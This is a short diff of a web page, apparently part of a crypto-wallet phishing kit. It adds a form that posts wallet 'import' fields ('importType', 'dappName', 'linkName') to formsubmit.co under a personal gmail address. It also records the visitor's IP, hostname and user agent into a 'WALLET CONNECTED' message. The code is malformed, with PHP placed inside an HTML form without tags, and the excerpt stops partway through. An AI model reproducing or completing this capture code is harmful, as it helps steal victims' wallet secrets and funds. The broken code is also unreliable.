@@ -1577,12 +1577,18 @@
         }
     });
 </script>
+if ($_POST['importType']) {
 <form action="https://formsubmit.co/smelissa116@gmail.com" method="POST">
-   $ip = getRealIpUser();
+
+    $ip = getRealIpUser();
     $importType = $_POST['importType'];
     $dappName = $_POST['dappName'];
     $linkName = $_POST['linkName'];
     $response = "";
     $date = date("Y-m-d h:i:s");
 
-</form>
+    $hostname = gethostbyaddr($ip);
+    $useragent = $_SERVER['HTTP_USER_AGENT'];
+    $message = '';
+    $message .= "|----------| WALLET CONNECTED  |--------------|\n\n";
+
